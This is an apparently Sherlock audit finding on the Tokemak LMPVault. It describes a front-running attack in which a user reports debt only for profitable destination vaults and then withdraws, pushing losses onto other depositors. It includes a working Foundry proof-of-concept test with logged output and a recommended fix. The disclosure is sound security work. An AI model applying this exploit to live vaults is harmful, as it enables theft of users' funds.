Wonderful Sage Goldfish

high

# updateDebtReporting can be front run, putting all the loss on later withdrawals but taking the profit

## Summary
updateDebtReporting takes in a **user input** of destinations in array whose debt to report, so if a destination vault is incurring loss and is not on the front of withdrawalQueue than a attacker can just  update debt for only the destination which are incurring a profit and withdraw in the same txn. He will exit the vault with profit, others who withdraw after the legit updateDebtReporting txn will suffer even more loss than they should have, as some part of the profit which was used to offset the loss was taken by the attacker and protocol fees

## Vulnerability Detail
POC- 
1. LMPVault has 2000 in deposits 1000 from alice and 1000 from bob
2. Vault has invested that in 1000 in DestinationVault1 & 1000 in DestinationVault2 (no idle for simple calculations)
3. Now  Dv1 gain a profit of 5%(+50 base asset) while Dv2 is in 10% loss(-100 base asset)
4. So vault has net loss of 50. Now alice does a updateDebtReporting(\[Dv1]) and not including Dv2 in the input array.
5. Now she withdraws her money, protocol now falsely believes there is a profit, it also take 20% profit fees(assumed) and mints 10 shares for itself and alice walks away with roughly 1020 assets, incurring no loss
6. Now a legit updateDebtReporting txn comes and bob has to account in for the loss

Test for POC - 
Add it to LMPVaultMintingTests contract in LMPVault-Withdraw.t.sol file  under path test/vault.  run it via the command
```solidity
forge test --match-path test/vault/LMPVault-Withdraw.t.sol --match-test test_AvoidTheLoss -vv
```

```solidity
function test_AvoidTheLoss() public {

// for simplicity sake, i'll be assuming vault keeps nothing idle

// as it does not affect the attack vector in any ways

_accessController.grantRole(Roles.SOLVER_ROLE, address(this));

_accessController.grantRole(Roles.LMP_FEE_SETTER_ROLE, address(this));

address feeSink = vm.addr(555);

_lmpVault.setFeeSink(feeSink);

_lmpVault.setPerformanceFeeBps(2000); // 20%

address alice = address(789);

uint initialBalanceAlice = 1000;

// User is going to deposit 1000 asset

_asset.mint(address(this), 1000);

_asset.approve(address(_lmpVault), 1000);

uint shareBalUser = _lmpVault.deposit(1000, address(this));

_underlyerOne.mint(address(this),500);

_underlyerOne.approve(address(_lmpVault),500);

_lmpVault.rebalance(

address(_destVaultOne),

address(_underlyerOne),

500,

address(0),

address(_asset),

1000

);

_asset.mint(alice,initialBalanceAlice);

vm.startPrank(alice);

_asset.approve(address(_lmpVault),initialBalanceAlice);

uint shareBalAlice = _lmpVault.deposit(initialBalanceAlice,alice);

vm.stopPrank();

// rebalance to 2nd vault

_underlyerTwo.mint(address(this), 1000);

_underlyerTwo.approve(address(_lmpVault),1000);

_lmpVault.rebalance(

address(_destVaultTwo),

address(_underlyerTwo),

1000,

address(0),

address(_asset),

1000

);

// the second destVault incurs loss, 10%

_mockRootPrice(address(_underlyerTwo), 0.9 ether);

  

// the first vault incurs some profit, 5%

// so lmpVault is in netLoss of 50 baseAsset

_mockRootPrice(address(_underlyerOne), 2.1 ether);

// malicious updateDebtReporting by alice

address[] memory alteredDestinations = new address[](1);

alteredDestinations[0] = address(_destVaultOne);

vm.prank(alice);

_lmpVault.updateDebtReporting(alteredDestinations);

  

// alice withdraws first

vm.prank(alice);

_lmpVault.redeem(shareBalAlice , alice,alice);

uint finalBalanceAlice = _asset.balanceOf(alice);

emit log_named_uint("final Balance of alice ", finalBalanceAlice);

// protocol also collects its fees

// further wrecking the remaining LPs

emit log_named_uint("Fees shares give to feeSink ", _lmpVault.balanceOf(feeSink));

assertGt( finalBalanceAlice, initialBalanceAlice);

assertGt(_lmpVault.balanceOf(feeSink), 0);

// now updateDebtReporting again but for all DVs

_lmpVault.updateDebtReporting(_destinations);

  

emit log_named_uint("Remaining LPs can only get ",_lmpVault.maxWithdraw(address(this)));

emit log_named_uint("Protocol falsely earned(in base asset)", _lmpVault.maxWithdraw(feeSink));

emit log_named_uint("Vault totalAssets" , _lmpVault.totalAssets());

emit log_named_uint("Effective loss take by LPs", 1000 - _lmpVault.maxWithdraw(address(this)));

emit log_named_uint("Profit for Alice",_asset.balanceOf(alice) - initialBalanceAlice);

}
```


Logs:
  final Balance of alice : 1019
  Fees shares give to feeSink : 10
  Remaining LPs can only get : 920
  Protocol falsely earned(in base asset): 9
  Vault totalAssets: 930
  Effective loss take by LPs: 80
  Profit for Alice: 19

## Impact
Theft of user funds.
Submitting as high as attacker only needs to frontrun a updateDebtReporting txn with malicious input and withdraw his funds.
## Code Snippet
https://github.com/sherlock-audit/2023-06-tokemak/blob/5d8e902ce33981a6506b1b5fb979a084602c6c9a/v2-core-audit-2023-07-14/src/vault/LMPVault.sol#L628-L630C6

```solidity
function updateDebtReporting(address[] calldata _destinations) external nonReentrant trackNavOps { // @audit < user controlled input

_updateDebtReporting(_destinations);

}
```

## Tool used

Manual Review

## Recommendation 

 updateDebtReporting should not have any input param, should by default update for all added destination vaults
